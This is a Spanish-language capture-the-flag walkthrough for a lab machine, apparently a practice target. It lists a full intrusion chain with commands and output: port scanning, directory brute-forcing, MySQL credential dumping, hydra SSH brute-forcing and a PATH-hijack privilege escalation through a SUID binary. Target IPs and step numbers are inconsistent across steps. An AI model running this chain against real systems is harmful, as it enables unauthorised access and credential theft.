1. Escaneo de puertos abiertos 
```
nmap -p- --open --min-rate 5000 -n -Pn -vvv -sCSV 192.168.18.85 -oN scanPorts
```
Impresión
```
Discovered open port 3306/tcp on 192.168.18.94
Discovered open port 22/tcp on 192.168.18.94
Discovered open port 80/tcp on 192.168.18.94
```

2. Ataque de diccionario al URL
```
gobuster dir -t 20 -u http://192.168.18.94/ -w /usr/share/wordlist/common.txt
```
Impresión
```
/core                 (Status: 301) [Size: 313] [--> http://192.168.18.94/core/]
```

3. Descargar el archivo `databases.yml` que se encuentra dentro del directorio  `http://192.168.18.94/core/`
4. Entrar a la base de datos con el usuario encontrado en `databases.yml` con la contraseña `UcVQCMQk2STVeS6J`
```
mysql -u qdpmadmin -h 192.168.18.94 -p
```
5. Buscar usuarios y credenciales potenciales 
```
> show databases;
```
Impresión
```mysql
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| qdpm               |
| staff              |
| sys                |
+--------------------+
```

```
> use staff;
> show tables;
```
Impresión
```mysql
+-----------------+
| Tables_in_staff |
+-----------------+
| department      |
| login           |
| user            |
+-----------------+
```

```
> select * from login;
```
impresión 
```mysql
+-----+---------+--------------------------+
| id   | user_id | password                 |
+------+---------+--------------------------+
|    1 |       2 | c3VSSkFkR3dMcDhkeTNyRg== |
|    2 |       4 | N1p3VjRxdGc0MmNtVVhHWA== |
|    3 |       1 | WDdNUWtQM1cyOWZld0hkQw== |
|    4 |       3 | REpjZVZ5OThXMjhZN3dMZw== |
|    5 |       5 | Y3FObkJXQ0J5UzJEdUpTeQ== |
+------+---------+--------------------------+
```

```
> select * form user;
```
impresión
```mysql
+------+---------------+--------+---------------------------+
| id   | department_id | name   | role                      |
+------+---------------+--------+---------------------------+
|    1 |             1 | Smith  | Cyber Security Specialist |
|    2 |             2 | Lucas  | Computer Engineer         |
|    3 |             1 | Travis | Intelligence Specialist   |
|    4 |             1 | Dexter | Cyber Security Analyst    |
|    5 |             2 | Meyer  | Genetic Engineer          |
+------+---------------+--------+---------------------------+
```

6. Recopilar usuarios y contraseñas en archivos separados
7. Des encriptar los hashes (Con cada uno)
```
> echo "Y3FObkJXQ0J5UzJEdUpTeQ==" | base64 -d
```

8. Ataque con `hydra` al puerto 22 utilizando los usuarios y contraseñas
```
hydra -L users -P passwords ssh://192.168.160.94
```

7. Con hydra probar contraseñas y usuarios 
```
hydra -L users -P pa ssh://192.168.160.221
```
impresión 
```bash
[22][ssh] host: 192.168.18.122   login: travis   password: DJceVy98W28Y7wLg
[22][ssh] host: 192.168.18.122   login: dexter   password: 7ZwV4qtg42cmUXGX
```
8. Entrar por el protocolo ssh 
```
ssh travis@192.168.18.122
```
9. Buscar archivos con permisos `SUID`
```
find / -perm -4000 -user root 2>/dev/null 
```
impresión
```
/opt/get_access
/usr/bin/chfn
```

10. Ver caracteres imprimibles del archivo 
```
strings /opt/get_access
```
11. Realizar un `PathHacking` a `cat`
```
cd /tmp
touch cat
chmod +x cat
export PATH=/tmp:$PATH
```

13. Dentro del archivo `cat`
```bash
chmod u+s /bin/bash
```
14. Ejecutar el archivo `/opt/get_access`
15. Abrir una `bash` con todos los permisos
```
bash -p
```
16. Volver a configurar el `PATH`
```
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```
17. Maquina resuelta 
```
cat /root/root.txt
```
Impresión 
```
ICA{Next_Generation_Self_Renewable_Genetics}
```
